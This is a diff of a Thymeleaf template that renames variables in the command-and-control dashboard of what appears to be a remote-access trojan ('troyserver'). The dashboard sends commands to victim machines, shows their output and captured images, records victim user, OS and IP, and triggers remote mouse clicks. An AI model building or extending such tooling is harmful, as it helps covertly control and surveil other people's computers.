@@ -11,17 +11,17 @@
 <center>
     <div id="outer">
         <div id="inner">
-            <h1 th:text="'Control Panel for ' + ${model.client.pcNickname}"></h1>
+            <h1 th:text="'Control Panel for ' + ${client.nickname}"></h1>
             <hr/>
             <div class="w3-card-4 w3-container w3-light-grey">
                 <h3>Client Commands</h3>
-                <pre th:text="${model.client.commands} + ' '" class="log"></pre>
+                <pre th:text="${client.command} + ' '" class="log"></pre>
 
                 <br/>
-                <form th:action="'/command/edit/' + ${model.client.pcName}" th:method="post" method="post">
+                <form th:action="'/command/edit/' + ${client.client}" th:method="post" method="post">
                     <label for="commandsField">Command:</label>
                     <input style="width: 400px;" id="commandsField" spellcheck="false" name="commands"
-                           th:value="${model.client.commands}" class="input log w3-card-4" autocomplete="off"
+                           th:value="${client.command}" class="input log w3-card-4" autocomplete="off"
                            placeholder="Command"/>
                     <input type="submit" class="input w3-card-4" value="Speichern" id="primaryAction"/>
                 </form>
@@ -30,9 +30,9 @@
             <br/>
             <div class="w3-card-4 w3-container w3-light-grey">
                 <h3>Commands output</h3>
-                <form th:action="'/dashboard/' + ${model.client.pcName}" th:method="post" method="post">
+                <form th:action="'/dashboard/' + ${client.client}" th:method="post" method="post">
                     <input type="submit" value="Clear" class="input secondaryAction w3-card-4"/>
-                    <a th:href="'/dashboard/' + ${model.client.pcName}"
+                    <a th:href="'/dashboard/' + ${client.client}"
                        class="input secondaryAction w3-card-4">Reload</a>
                 </form>
                 <!--/*@thymesVar id="log" type="ch.lebois.troyserver.controller.DashboardController"*/-->
@@ -51,31 +51,31 @@
                                 <th>
                                     <b>Computer User</b>
                                 </th>
-                                <td th:text="${model.client.pcuser}"></td>
+                                <td th:text="${client.pcuser}"></td>
                             </tr>
                             <tr>
                                 <th>
                                     <b>Last Seen</b>
                                 </th>
-                                <td th:text="${model.client.lastseen}"></td>
+                                <td th:text="${client.lastseen}"></td>
                             </tr>
                             <tr>
                                 <th>
                                     <b>Operating System</b>
                                 </th>
-                                <td th:text="${model.client.os}"></td>
+                                <td th:text="${client.os}"></td>
                             </tr>
                             <tr>
                                 <th>
                                     <b>Ip Adress</b>
                                 </th>
-                                <td th:text="${model.client.ip}"></td>
+                                <td th:text="${client.ip}"></td>
                             </tr>
                             <tr>
                                 <th>
                                     <b>Hermann Arch</b>
                                 </th>
-                                <td th:text="${model.client.arch}"></td>
+                                <td th:text="${client.arch}"></td>
                             </tr>
                         </table>
                     </div>
@@ -88,7 +88,7 @@
                                 th:onClick="'javascript:document.getElementById(\''+ ${img.name} +'\').style.display=\'block\';'">
                                 <a th:text="${img.name}">
                                 </a>
-                                <a th:href="'/dashboard/img/' + ${img.name} + '/remove?client=' + ${model.client.pcName}"
+                                <a th:href="'/dashboard/img/' + ${img.name} + '/remove?client=' + ${client.client}"
                                    class="w3-button w3-display-right w3-hover-red">&times;</a>
                             </li>
                         </ul>
@@ -104,7 +104,7 @@
                 <div class="w3-col s6">
                     <div class="w3-card-4 w3-container w3-light-grey">
                         <h3>Settings</h3>
-                        <form th:action="'/dashboard/' + ${model.client.pcName} + '/edit'" method="post">
+                        <form th:action="'/dashboard/' + ${client.client} + '/edit'" method="post">
                             <table class="w3-table w3-bordered">
                                 <tr>
                                     <th width="50%" style="padding-top: 15px">
@@ -118,7 +118,7 @@
                                         Pc Name
                                     </th>
                                     <td width="50%">
-                                        <input name="nickname" th:value="${model.client.pcNickname}" class="w3-input"/>
+                                        <input name="nickname" th:value="${client.nickname}" class="w3-input"/>
                                     </td>
                                 </tr>
                                 <tr>
@@ -126,7 +126,7 @@
                                         Refresh time
                                     </th>
                                     <td width="50%">
-                                        <input name="refresh" th:value="${model.client.refreshtime}" class="w3-input"
+                                        <input name="refresh" th:value="${client.refreshtime}" class="w3-input"
                                                type="number"/>
                                     </td>
                                 </tr>
@@ -171,7 +171,7 @@
                                         Mouse click
                                     </th>
                                     <td width="50%">
-                                        <form th:action="'/dashboard/' + ${model.client.pcName} + '/click'"
+                                        <form th:action="'/dashboard/' + ${client.client} + '/click'"
                                               method="post">
                                             <input type="submit" value="Click"
                                                    class="input secondaryAction w3-card-4"/>
